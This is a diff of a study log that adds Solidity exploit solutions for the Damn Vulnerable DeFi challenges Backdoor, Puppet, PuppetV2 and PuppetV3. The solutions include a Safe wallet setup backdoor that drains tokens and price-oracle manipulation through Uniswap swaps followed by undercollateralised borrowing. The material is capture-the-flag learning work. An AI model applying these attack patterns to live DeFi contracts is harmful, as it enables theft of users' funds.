@@ -164,7 +164,7 @@ contract Exploit{
 #### Selfie
 Issue:
 
-I feel the biggest issue is that the pool is providing the governance token via flash loan; as long as the token exceeds half of the supply, the proposal can be passed.
+I feel the biggest issue is that the pool is providing the governance token via flashloan, as long as the token exceed half of the supply, the proposal can be passed.
 
 ```solidity
     function _hasEnoughVotes(address who) private view returns (bool) {
@@ -244,6 +244,244 @@ contract SelfiePoolExploit {
         governance.executeAction(actionId);
     }
 }
+```
+
+
+### 2024.09.01
+
+- Damn Vulnerable DeFi: Backdoor
+
+#### Backdoor
+
+Solve:
+
+```solidity
+    function test_backdoor() public checkSolvedByPlayer {
+        BackdoorAttacker ba = new BackdoorAttacker(recovery, token);
+        ba.attack(
+            address(walletFactory),
+            address(singletonCopy), 
+            address(walletRegistry), 
+            users
+        );
+
+    }
+```
+
+```solidity
+interface ISafe {
+    function setup(
+        address[] calldata _owners,
+        uint256 _threshold,
+        address to,
+        bytes calldata data,
+        address fallbackHandler,
+        address paymentToken,
+        uint256 payment,
+        address payable paymentReceiver
+    ) external;
+}
+import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+
+contract Approve {
+  function approve(DamnValuableToken token, address spender) external {
+      token.approve(spender, type(uint256).max);
+    }
+}
+
+contract BackdoorAttacker {
+  address recovery;
+  DamnValuableToken token;
+  Approve mApprove;
+
+  constructor(address _recovery, DamnValuableToken _token) {
+    recovery = _recovery;
+    token = _token;
+  }
+
+  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
+    mApprove = new Approve();
+    for (uint256 i = 0; i < 4; i++) {
+            address[] memory users = new address[](1);
+            users[0] = _users[i];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                users,
+                1,
+                mApprove,
+                abi.encodeWithSelector(Approve.approve.selector, token, address(this)),
+                address(0x0),
+                address(0x0),
+                0,
+                address(0x0)
+            );
+
+            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
+                _singletonCopy,
+                initializer,
+                i,
+                IProxyCreationCallback(_walletRegistry)
+            );
+
+            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
+        }
+    }  
+}
+```
+
+### 2024.09.03
+
+- Damn Vulnerable DeFi: Puppet
+- Damn Vulnerable DeFi: PuppetV2
+
+#### Puppet
+
+Issue: The main issue is using the price from pair which can be manipulated.
+
+Solve:
+```
+contract PuppetExploit {
+
+    PuppetPool lendingPool;
+    address recovery;
+    DamnValuableToken token;
+    IUniswapV1Exchange uniswapV1Exchange; 
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+
+    constructor(PuppetPool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange) {
+        lendingPool = _lendingPool;
+        recovery = _recovery;
+        token = _token;
+        uniswapV1Exchange = _uniswapV1Exchange;
+    }
+
+    function attack() public {
+        
+        uint256 total = token.balanceOf(address(lendingPool));
+        lendingPool.calculateDepositRequired(total);
+
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+
+        uniswapV1Exchange.tokenToEthSwapInput(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            block.timestamp + 1
+        );
+
+        uint256 need = lendingPool.calculateDepositRequired(total);
+
+        assert(need < address(this).balance);
+
+        lendingPool.borrow{value: need}(
+            POOL_INITIAL_TOKEN_BALANCE,
+            recovery
+        );
+        
+    }
+
+    receive() external payable {}
+
+    
+}
+```
+
+#### PuppetV2
+
+Issue: Similar to the previous one
+
+Solve:
+```solidity
+contract PuppetV2Exploit {
+
+    PuppetV2Pool lendingPool;
+    address recovery;
+    DamnValuableToken token;
+    IUniswapV2Pair uniswapV2Exchange; 
+    WETH weth;
+    IUniswapV2Router02 uniswapV2Router;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+
+    constructor(PuppetV2Pool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV2Pair _uniswapV2Exchange, WETH _weth, IUniswapV2Router02 _uniswapV2Router) {
+        lendingPool = _lendingPool;
+        recovery = _recovery;
+        token = _token;
+        uniswapV2Exchange = _uniswapV2Exchange;
+        weth = _weth;
+        uniswapV2Router = _uniswapV2Router;
+    }
+
+    function attack() public {
+                
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        weth.deposit{value: address(this).balance}();
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+//3e23
+        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1, 
+            path, 
+            address(this), 
+            block.timestamp + 100
+        );
+
+
+        uint256 need = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), type(uint256).max);
+
+
+        assert(need < weth.balanceOf(address(this)));
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+        
+    }
+
+    receive() external payable {}
+
+    
+}
+```
+### 2024.09.04
+
+- Damn Vulnerable DeFi: PuppetV3
+
+#### PuppetV3
+```solidity
+    function test_puppetV3() public checkSolvedByPlayer {
+        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(router), type(uint256).max);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                FEE,
+                address(player),
+                block.timestamp + 1,
+                PLAYER_INITIAL_TOKEN_BALANCE, 
+                0,
+                0
+            )
+        );
+
+        while(true){
+            vm.warp(block.timestamp + 10);
+            uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+            if(quote <= weth.balanceOf(player)) break;
+        }
+
+        console.log("Time: ", block.timestamp);
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);   
+
+    }
 ```
 
 <!-- Content_END -->
